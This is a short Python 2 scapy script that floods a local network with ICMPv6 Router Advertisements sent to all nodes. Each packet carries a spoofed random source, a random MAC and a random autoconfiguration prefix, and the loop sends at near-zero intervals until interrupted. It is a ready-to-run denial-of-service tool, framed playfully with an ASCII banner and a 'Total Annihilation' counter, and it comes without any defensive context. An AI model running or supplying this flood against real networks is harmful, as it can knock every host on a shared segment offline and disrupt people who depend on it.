import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import random

"""                             
print( ▄▄▄       ██ ▄█▀ █    ██ ▄▄▄█████▓ ▒█████       ██████  ▄▄▄       ██▓)
print(▒████▄     ██▄█▒  ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒   ▒██    ▒ ▒████▄    ▓██▒)
print(▒██  ▀█▄  ▓███▄░ ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒   ░ ▓██▄   ▒██  ▀█▄  ▒██▒)
print(░██▄▄▄▄██ ▓██ █▄ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░     ▒   ██▒░██▄▄▄▄██ ░██░)
print( ▓█   ▓██▒▒██▒ █▄▒▒█████▓   ▒██▒ ░ ░ ████▓▒░   ▒██████▒▒ ▓█   ▓██▒░██░)
print( ▒▒   ▓▒█░▒ ▒▒ ▓▒░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░    ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░▓  )
print(  ▒   ▒▒ ░░ ░▒ ▒░░░▒░ ░ ░     ░      ░ ▒ ▒░    ░ ░▒  ░ ░  ▒   ▒▒ ░ ▒ ░)
print(  ░   ▒   ░ ░░ ░  ░░░ ░ ░   ░      ░ ░ ░ ▒     ░  ░  ░    ░   ▒    ▒ ░)
print(      ░  ░░  ░      ░                  ░ ░           ░        ░  ░ ░  )  
"""

a = 1

try:
    	print " Welcome to the PARTY!!!!."
    	interface = raw_input("\nSelect Network Interace: ")
	print "\nDeploying LUCY. Let's DANCE!!! "

	while a > 0:
	    mac = "aa:11:" + ":".join(("%02x" % random.randint(0, 255) for i in range(4)))
	    ipv6 = "fe80::218:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3)))
	    prefix1 = "2a01:" + ":".join(("%x" % random.randint(0, 16**4) for i in range(3))) + "::"

	    try:
		packet = IPv6(src = ipv6, dst = "ff02::1")/ICMPv6ND_RA(chlim = 255, routerlifetime = 65535, reachabletime= 16384000,retranstimer= 1966080)/ICMPv6NDOptMTU(mtu = 1500)/ICMPv6NDOptPrefixInfo(prefixlen = 64, L=1, A=1, R=1, res1=0,prefix = prefix1 )/ICMPv6NDOptSrcLLAddr(lladdr = mac)

	    except socket.error:
		pass

	    send(packet, inter = 0.0000000001, verbose = 0, iface = interface) #You can turn on verbose output if you want but it wil just print star(*).

	    print "*",
	    a = a+1
except KeyboardInterrupt:
    print "Asmodeus Interrupted"

print "Total Annihilation: %d " %a

